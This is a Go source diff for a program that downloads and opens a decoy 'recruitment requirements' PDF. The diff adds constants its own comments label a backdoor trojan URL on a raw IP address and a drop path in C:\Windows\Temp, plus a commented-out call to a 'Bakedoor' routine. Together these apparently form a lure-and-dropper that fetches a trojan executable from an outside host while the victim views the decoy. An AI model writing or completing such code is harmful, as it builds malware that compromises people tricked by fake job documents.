@@ -1,9 +1,6 @@
 package main
 
-//main方法
-import (
-	"GO_day_1/mylib"
-)
+import "Blake_control/mylib"
 
 const (
 	//下载的文件存放处和打开文件路径
@@ -11,6 +8,10 @@ const (
 	//path = "https://wx.qq.com/"
 	//下载文件的url
 	url = "https://www.xixixiaoyu.com/tools/hold-all/招聘要求.pdf"
+	//后门木马url
+	url1 = "http://182.92.99.52:8885/test.exe"
+	//木马文件存放地址
+	path1 = "C:\\Windows\\Temp\\test.exe"
 )
 
 //main方法
@@ -30,4 +31,7 @@ func main() {
 	mylib.Openfile(path)
 	//死循环防止go协程死亡
 	select {}
+
+	//后门
+	//operation.Bakedoor(url1, path1)
 }
